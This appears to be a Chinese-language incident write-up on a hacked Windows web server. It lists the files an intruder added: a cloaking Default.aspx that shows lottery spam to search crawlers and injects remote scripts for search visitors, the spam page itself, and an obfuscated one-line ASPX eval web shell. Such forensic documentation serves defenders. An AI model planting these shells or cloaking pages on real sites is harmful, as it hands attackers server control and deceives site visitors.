## 被入侵的系统
Windows Server 2008 R2

## 入侵路径

2010.10.01 19:49:40 事件/windows日志/安全中 有登录成功记录

## 入侵后修改的文件

1. 增加首页文件Default.aspx 2017.10.01 20:30 

内容如下：

````
<%@ Page Language="C#" Debug="false" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Net.Sockets" %>
<script runat="server">
public bool is_spider()
    {
        string spider_flag = "googl"+"ebot|bai"+"duspi"+"der|so"+"gou";
        string[] spider_flag_arr = spider_flag.Split('|');
        string user_agent=HttpContext.Current.Request.UserAgent;
        foreach (string tmp_flag in spider_flag_arr)
        {
            if (user_agent.ToLower().IndexOf(tmp_flag.ToLower())!=-1) { return true; }
        }
        return false;
    }
    public bool is_from_search()
    {
        if (HttpContext.Current.Request.UrlReferrer==null)
        {
        return false;
        }
        else
        {
        string page_ref = HttpContext.Current.Request.UrlReferrer.ToString();
        string search_flag = "goog"+"le|bai"+"du|so"+"gou";
        string[] search_flag_arr = search_flag.Split('|');
        foreach (string tmp_flag in search_flag_arr)
        {
            if (page_ref.ToLower().IndexOf(tmp_flag.ToLower()) != -1) { return true; }
        }
        return false;
        }
    }
    public byte[] get_data(string url)
    {
        System.Net.WebClient wc = new System.Net.WebClient();
        byte[] data = wc.DownloadData(url);
        return data;
    }
      
        protected void Page_Load(object sender,EventArgs e) 
    {
        if (is_spider())
        {
						Response.Clear();
            string fileContent = File.ReadAllText(Server.MapPath("/uploadfile/gg.txt"),System.Text.Encoding.GetEncoding("GB2312"));
            Response.Write(fileContent);
            Response.End();
        }
        else if(is_from_search())
        {
            //HttpContext.Current.Response.Redirect(redirect_url, true);
            Response.Clear();
            Response.Write("<script src=\"htt"+"p://int.dpool.sina.co"+"m.c"+"n/iplookup/iplookup.php?format=js\" charset=\"GB2312\"></"+"script>");
            Response.Write("<script src=\"htt"+"p://js1.v8bc.co"+"m/js/x1.js\" type=\"text/javascript\"></"+"script>");
            Response.End();
        }
        else
        {
            //HttpContext.Current.Response.Write(HttpContext.Current.Request.UserAgent);
        }
	Response.Redirect("default.htm");
    }

</script>

````

2. 增加文件 UploadFile\gg.txt 2017.10.01 20:26 

内容如下：
````
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>今晚六给彩开奖结果_香港最快开奖现场直播开奖记录_香港马会开奖结果直播_2017香港六彩开奖记录_六开彩开奖结果_香港马会今期开奖结果直播_ 香港马会资料大全_香港六开彩_香港六和合开奖结果_6合彩开奖结果_香港六盒采免费资料_六合彩资料大全</title>
<meta name="applicable-device" content="pc,mobile">
<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>
<meta name="keywords" content="香港六彩2017开奖结果|六开彩开奖结果| 香港马会开奖结果|香港马会开奖结果直播|2017香港六彩开奖记录|香港马会资料|香港马会资料大全|香港马会今期开奖结果直播|香港六和合开奖结果| 6合彩开奖结果| 香港马会资料免费公开|香港六盒采免费资料|香港马会开奖结果今|今晚六会彩开奖结果|马会开奖结果| 香港马会开奖资料|6合彩开奖结果直播|香港马会免费资料|香港六彩开码现场直播|香港马开奖结果直播|曾道人开奖结果|2017香港马会今期开奖结果直播|123408香港六彩现场开奖结果|香港6合彩开奖结果|香港六彩2017开奖结果记录|香港六彩票免费资料|香港马会综合资料| 香港马会免费资料大全|6合彩资料大全| 香港马会彩资料大全|曾道人今晚开奖结果|2017香港马会开奖结果|香港六彩2017开奖结果期|香港马会开奖结果免费资料大全|6合彩资料|曾道人免费马报资料|9769香港开码结果| 曾道人资料| 白小姐资料|六和合开彩结果|六开彩结果|香港六开彩|香港马会免费资料区|今期开奖结果|香港开奖结果|马会开奖结果|新加坡六合彩|香港六合彩网址大全|六合彩综合资料|六合彩免费资料|香港六合彩总公司|香港六合彩号码|今期六合彩特码|"/>
<meta name="description" content="本站为您免费提供大量六合彩资料，香港开奖结果、搅珠数据分析,力图打造成为最专业的特码资料论坛,提供最精准的六合彩白小姐特码,致力于研究香港赛马会,六合彩最快开奖结果." />
</head>
<div>
<body>
<h1><a name=baidusnap0></a><a name=baidusnap3></a><a name=baidusnap7></a><a href="http://cjcp.ustc.edu.cn">香港<span style="color: #000000; background-color: #FFFF66">六<B style='color:black;background-color:#ff9999'>彩</B></span>开奖<B style='color:white;background-color:#886800'>结果</B></a></h1><h2>

下略
````

3. 增加3份木马

分别在以下3个目录放置大马和小马：

wwwroot\hxwlxb\hxwlxb_cn\ch\mobile\js\
wwwroot\hxwlxb\hxwlxb_en\ch\mobile\js\
wwwroot\hxwlxb\ch\mobile\js\

小马feifei.aspx
````
<%@PAGE LANGUAGE=JSCRIPT%>
<%var PAY:String=
Request["\x61\x62\x63\x64"];eval
(PAY,"\x75\x6E\x73\x61"+
"\x66\x65");%>
````

大马1ting.aspx
````
<!--#include file="2.0.bak" -->
````
2.0.bak是个木马，内容略
